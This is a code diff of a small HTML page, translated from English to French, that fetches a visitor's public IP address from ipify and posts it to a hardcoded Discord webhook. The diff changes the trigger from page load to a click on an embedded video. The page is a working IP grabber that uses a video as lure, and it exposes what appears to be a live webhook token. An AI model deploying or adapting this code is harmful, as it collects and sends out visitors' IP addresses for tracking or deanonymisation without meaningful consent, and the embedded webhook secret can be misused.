@@ -1,27 +1,43 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send IP to Webhook</title>
+    <title>Envoyer l'IP via vidéo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        video {
+            width: 80%;
+            max-width: 600px;
+            cursor: pointer;
+            border: 5px solid #ddd;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
     <script>
-        // Function to get the user's public IP
+        // Fonction pour obtenir l'IP de l'utilisateur
         function getUserIP() {
-            fetch('https://api.ipify.org?format=json')  // Use ipify API to get IP
-                .then(response => response.json())  // Parse the JSON response
+            fetch('https://api.ipify.org?format=json')  // Utilisation de l'API ipify pour obtenir l'IP
+                .then(response => response.json())  // Convertir la réponse en JSON
                 .then(data => {
-                    const ip = data.ip;  // Extract IP from the response
-                    console.log("User IP: " + ip);
-                    sendIPToWebhook(ip);  // Send IP to the webhook
+                    const ip = data.ip;  // Extraire l'IP
+                    console.log("IP récupérée : " + ip);
+                    sendIPToWebhook(ip);  // Envoi de l'IP au webhook
                 })
                 .catch(error => {
-                    console.error('Error getting IP:', error);  // Handle errors
+                    console.error('Erreur lors de la récupération de l\'IP :', error);  // En cas d'erreur
                 });
         }
 
-        // Function to send the IP to a webhook
+        // Fonction pour envoyer l'IP au Webhook
         function sendIPToWebhook(ip) {
-            const webhookURL = 'https://discord.com/api/webhooks/1298060269746000003/m9Kfr8xelRc-S2prFOgfjBi2OH4fEZLYYi6MPioKq_st23cEFvTLcirHGsJBFDLKOF0b'; // Replace with your webhook URL
+            const webhookURL = 'https://discord.com/api/webhooks/1298060269746000003/m9Kfr8xelRc-S2prFOgfjBi2OH4fEZLYYi6MPioKq_st23cEFvTLcirHGsJBFDLKOF0b';  // Remplacez par votre propre URL de webhook
             const payload = JSON.stringify({ ip: ip });
 
             fetch(webhookURL, {
@@ -29,23 +45,31 @@
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: payload  // Send the IP in the body of the POST request
+                body: payload  // Envoi de l'IP dans le corps de la requête POST
             })
             .then(response => response.json())
             .then(data => {
-                console.log('Webhook Response:', data);  // Handle response from webhook
+                console.log('Réponse du webhook :', data);  // Réponse du webhook (si nécessaire)
             })
             .catch(error => {
-                console.error('Error sending IP to webhook:', error);  // Handle errors
+                console.error('Erreur lors de l\'envoi de l\'IP au webhook :', error);  // En cas d'erreur
             });
         }
 
-        // Run the function as soon as the page loads
-        window.onload = getUserIP;
+        // Ajouter un écouteur d'événement pour capturer le clic sur la vidéo
+        function onVideoClick() {
+            console.log('Vidéo cliquée, récupération de l\'IP...');
+            getUserIP();  // Lancer la fonction pour obtenir l'IP et l'envoyer
+        }
     </script>
 </head>
 <body>
-    <h1>Sending IP to Webhook</h1>
-    <p>Your IP is being sent to the webhook...</p>
+    <h1>Cliquez sur la vidéo pour envoyer votre IP au Webhook</h1>
+    <!-- Vidéo à cliquer -->
+    <video onclick="onVideoClick()" controls>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"> <!-- Exemple de vidéo -->
+        Votre navigateur ne supporte pas la vidéo HTML5.
+    </video>
+    <p>Lorsque vous cliquez sur la vidéo, votre adresse IP sera envoyée.</p>
 </body>
 </html>
